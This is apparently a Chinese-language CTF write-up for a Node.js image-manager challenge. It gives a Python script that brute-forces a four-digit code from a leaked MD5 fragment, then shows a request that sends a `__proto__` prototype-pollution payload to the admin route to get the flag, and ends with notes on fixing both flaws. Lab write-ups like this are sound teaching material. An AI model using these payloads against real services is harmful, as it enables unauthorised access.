# week4还没有对象吧，快来new一个js对象

## 题目简述

Node.js 图片管理器先用一个四位验证码保护下载接口，验证码只泄露 MD5 摘要的 6 个十六进制字符，可以枚举恢复。下载的图片给出管理员密码线索；登录后，递归对象合并函数允许通过 `__proto__` 污染原型，使新对象继承 `girlfriend = "fmyy"` 并通过检查。

## 解题过程

`/getcode` 返回下面这个比较式的右侧 6 位摘要：

```javascript
md5_encode("X1cT34m_" + code).substring(4, 10)
```

`code` 只有 `0000` 到 `9999`，可在本地穷举：

```python
import hashlib

def recover_code(fragment):
    for number in range(10000):
        code = f"{number:04d}"
        digest = hashlib.md5(f"X1cT34m_{code}".encode()).hexdigest()
        if digest[4:10] == fragment:
            return code
    raise ValueError("code not found")
```

每成功下载一次，服务端都会重新生成验证码，因此枚举图片名时应为每次 `/download` 请求重新访问 `/getcode` 并恢复当前 code。遍历三位文件名后下载到的提示图片指出密码是御坂美琴生日 `0502` 的 Base64：

```text
base64("0502") = MDUwMg==
```

管理员路由调用自定义递归合并函数 `lovelove(target, source)`。当输入对象含有 `__proto__` 时，`__proto__` 已存在于目标对象，函数会递归进入其原型并写入 `girlfriend`。用 JSON 构造污染对象，并让 HTTP 客户端负责 URL 编码：

```python
import json
import requests

response = requests.get(
    "http://challenge/admin",
    params={
        "user": "admin",
        "passwd": "MDUwMg==",
        "a": json.dumps({"__proto__": {"girlfriend": "fmyy"}}),
    },
    timeout=5,
)
print(response.text)
```

`m1saka.girlfriend` 随后从被污染的原型链上取得 `fmyy`，返回：

```text
0xGame{do_u_like_these_diao_pictures}
```

## 方法总结

本题分为“弱验证码恢复”和“原型链污染”两段。前者的问题是四位空间过小且泄露可离线验证的摘要片段；后者的问题是递归合并未拒绝 `__proto__`、`constructor`、`prototype` 等危险键。两段都应分别修复，不能把登录前的图片线索当作最终漏洞。
